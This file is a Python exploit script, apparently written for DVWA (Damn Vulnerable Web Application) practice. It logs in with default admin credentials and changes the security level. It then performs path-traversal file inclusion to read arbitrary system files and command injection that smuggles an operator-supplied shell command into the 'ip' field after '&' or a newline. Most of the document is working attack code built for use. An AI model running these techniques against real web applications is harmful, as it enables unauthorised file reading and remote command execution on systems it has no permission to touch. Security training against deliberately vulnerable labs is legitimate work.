import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

# getting user token
def get_user_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    user_token = soup.find("input", {'name': 'user_token'})['value']
    return user_token

# login
def login(s, url):
    login_url = url + "/login.php"
    user_token = get_user_token(s, login_url)
    data = {'username': 'admin', 'password': 'password', 'Login': 'Login', 'user_token': user_token}
    r = s.post(login_url, data=data, verify=False, proxies=proxies)
    if "You have logged in as 'admin'" in r.text:
        return "[+] Successfully logged in as a admin user."

# setting desired security level
def set_security_level(s, url, security_level):
    security_level_url = url + "/security.php"
    user_token = get_user_token(s, security_level_url)
    data = {'security': security_level, 'seclev_submit': 'Submit', 'user_token': user_token}
    r = s.post(security_level_url, data=data, verify=False, proxies=proxies)
    if "Security Level:</em> " + security_level in r.text:
        return f"[+] Security level successfully set as {security_level}."

# file inclusion vulnerability
def file_inclusion(s, url, security_level):

    # low and medium security levels
    if security_level == "low" or security_level == "medium":
        file_name = input("Please enter the filename which you want to access in linux file system: ")
        file_inclusion_url = url + "/vulnerabilities/fi/?page=" + file_name
        r = s.get(file_inclusion_url, verify=False, proxies=proxies)
        print(r.text)
        # Extracting only file output using regex
        # pattern = r"^(.*?)<!DOCTYPE html>"# r'((?:.*\n)*)(?=<!DOCTYPE html)'
        # match = re.search(pattern, r.text, re.DOTALL)
        # # final_output = file_output.group(1).strip().split('\n')
        # if match:
        #     content_above_doctype = match.group(1)
        #     print(content_above_doctype)


    # high security levels
    elif security_level == "high":
        print("------------------------------------------------------------------------")
        file_name = input("Please enter the filename which you want to access in linux file system: ")
        file_inclusion_url = url + "/vulnerabilities/fi/?page=file/../../../../../.." + file_name
        r = s.get(file_inclusion_url, verify=False, proxies=proxies)
        print("------------------------------------------------------------------------")
        print(r.text)

    else:
        print("[-] Please enter the right input.")

# command injection
def command_injection(s, url, security_level):

    # low level security
    if security_level == "low" or security_level == "medium":
        print("------------------------------------------------------------------------")
        command = input("Please enter the command you want to run: ")
        command_injectin_url = url + "/vulnerabilities/exec/"
        data = {'ip': '127.0.0.1&' + command, 'Submit': 'Submit'}
        r = s.post(command_injectin_url, data=data, proxies=proxies, verify=False)
        print("------------------------------------------------------------------------")
        pattern = r"<pre>(.*?)</pre>"
        matches = re.findall(pattern, r.text, re.DOTALL)
        for i in matches:
            print(i)

    # high level security
    elif security_level == "high":
        print("------------------------------------------------------------------------")
        command = input("Please enter the command you want to run: ")
        command_injectin_url = url + "/vulnerabilities/exec/"
        data = {'ip': '127.0.0.1\n' + command, 'Submit': 'Submit'}
        r = s.post(command_injectin_url, data=data, proxies=proxies, verify=False)
        print("------------------------------------------------------------------------") 
        pattern = r"<pre>(.*?)</pre>"
        matches = re.findall(pattern, r.text, re.DOTALL)
        for i in matches:
            print(i)

    else:
        print("[-] Please enter the right input.")

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    s = requests.Session()
    url = sys.argv[1]
    login_response = login(s, url)
    if "[+] Successfully logged in as a admin user." == login_response:
        print("[+] Successfully logged in as a admin user.")

        # Setting the security level
        print("------------------------------------------------------------------------")
        print("Please enter the level of security you want to perform the attack with.")
        print("1. Low")
        print("2. Medium")
        print("3. High")
        print("4. Impossible")
        print("------------------------------------------------------------------------")
        print("Please write your choice is lower characters. For Example: low")
        security_level = input("Select from 1-4: ")
        set_security_level_response = set_security_level(s, url, security_level)
        if f"[+] Security level successfully set as {security_level}." == set_security_level_response:
            print("------------------------------------------------------------------------")
            print(f"[+] Security level successfully set as {security_level}")

        # Choosing and performing the attack
        print("------------------------------------------------------------------------")
        print("Please select the attack which you want to perform from below list.")
        print("1.Brute Force \n2.Command Injection \n3.CSRF \n4.File Inclusion \n5.File Upload \n6.Insecure CAPTCHA \n7.SQL Injection \n8.SQL Injection (Blind) \n9.Weak Session IDs \n10.XSS (DOM) \n11.XSS (Reflected) \n12.XSS (Stored) \n13.CSP Bypass \n14.JavaScript")
        print("------------------------------------------------------------------------")
        print("Please write your choice as mentioned above. For Example: File Inclusion")
        attack_name = input("Type the attack name: ")
        if attack_name == "File Inclusion":
            file_inclusion(s, url, security_level)
        elif attack_name == "Command Injection":
            command_injection(s, url, security_level)

if __name__ == "__main__":
    main()